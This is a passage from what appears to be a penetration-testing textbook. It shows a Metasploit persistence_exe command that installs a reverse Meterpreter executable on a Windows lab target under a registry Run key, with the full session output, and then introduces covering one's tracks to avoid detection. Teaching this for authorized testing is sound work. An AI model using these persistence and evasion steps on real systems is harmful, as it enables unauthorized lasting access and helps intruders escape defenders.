As noted, the Meterpreter service expects that you can connect inbound. Also, the Meterpreter service script is deprecated and may soon be removed from Metasploit. Instead, we can make use of the module that Metasploit points us to. In the next code listing, you will see the use of that module. It requires that you have an executable to upload and install on the target system. What is provided here is the output of the payload creation above. This was the reverse Meterpreter executable created from msfvenom. You will see that Meterpreter uploads the payload to the target system and creates a persistence executable. The Registry entries are then created to automatically run the persistence executable when the user logs in. You can see this from the reference to HKCU, which is HKEY_CURRENT_USER, the location in the Registry that has everything related to the logged in user.

# Using Metasploit module for persistence

```
meterpreter > run post/windows/manage/persistence_exe REXEPATH=/root/elfbowling.exe

[*] Running module against VAGRANT-2008R2
[*] Reading Payload from file /root/elfbowling.exe
[*] Persistent Script written to C:\Windows\SERVIC-2\LOCALS~1\AppData\Local\Temp\default.exe
[*] Executing script C:\Windows\SERVIC-2\LOCALS~1\AppData\Local\Temp\default.exe
[+] Agent executed with PID 5672
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\qWQPRsRzw
[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\qWQPRsRzw
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/VAGRANT-2008R2_20180912.4749/VAGRANT-2008R2_20180912.4749.rc
```

This gives us many ways to retain access to the target systems past the initial entry point. You may have noted, however, that these persistence mechanisms introduce files and Registry entries to the target system. These actions and artifacts can be detected, assuming there are detection mechanisms on the endpoint or that anyone is paying attention to activities on the endpoint. This is a consideration. As you are investigating your endpoints, you may notice whether there is malware detection or other sorts of detection software on the target.

# Covering Tracks

Anytime you gain access to a system as part of a penetration test or security assessment, you will be leaving footprints. The act of logging into a system leaves a log entry behind. Any files or other artifacts that may need to be left on the system have the potential of being located and flagged as malicious. This means the possibility of having your actions investigated and your foothold removed. You'd have to start all over again a target that is putting up additional hurdles for you to clear. This means you need to get good at covering up your existence as best you can.